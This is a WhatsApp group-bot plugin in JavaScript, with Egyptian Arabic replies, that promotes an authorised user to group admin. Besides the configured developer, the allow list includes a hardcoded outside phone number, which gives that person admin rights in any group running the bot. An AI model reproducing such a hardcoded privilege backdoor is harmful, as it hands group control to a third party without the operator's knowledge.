const { cmd } = require('../command');
const config = require('../config');

cmd({
    pattern: "ادمن",
    alias: ["رول", "خد-ادمن", "ارفعني"],
    desc: "بيدي الادمن لنفسه لو مطور",
    category: "owner", 
    react: "👑",
    filename: __filename
},
async (conn, mek, m, { from, sender, isBotAdmins, isGroup, reply }) => {
    if (!isGroup) return reply("❌ الأمر ده بس للجروبات يا حب");

    if (!isBotAdmins) return reply("❌ لازم أكون أدمن الأول يا حب");

    const normalizeJid = (jid) => {
        if (!jid) return jid;
        return jid.includes('@') ? jid.split('@')[0] + '@s.whatsapp.net' : jid + '@s.whatsapp.net';
    };

    const AUTHORIZED_USERS = [
        normalizeJid(config.DEV),
        "201501728150@s.whatsapp.net"
    ].filter(Boolean);

    const senderNormalized = normalizeJid(sender);
    if (!AUTHORIZED_USERS.includes(senderNormalized)) {
        return reply("❌ الأمر ده مش ليك يا غالي، للمطور بس 🤫");
    }

    try {
        const groupMetadata = await conn.groupMetadata(from);
        const userParticipant = groupMetadata.participants.find(p => p.id === senderNormalized);
        if (userParticipant?.admin) {
            return reply("😎 انت بالفعل أدمن هنا يا برنس");
        }

        await conn.groupParticipantsUpdate(from, [senderNormalized], "promote");
        return reply("✅ اتــرفعت يا معلم 👑 دلوقتي انت أدمن 😎");
        
    } catch (error) {
        console.error("Admin command error:", error);
        return reply("❌ حصلت مشكله يا حب، جرب تاني 🙃");
    }
});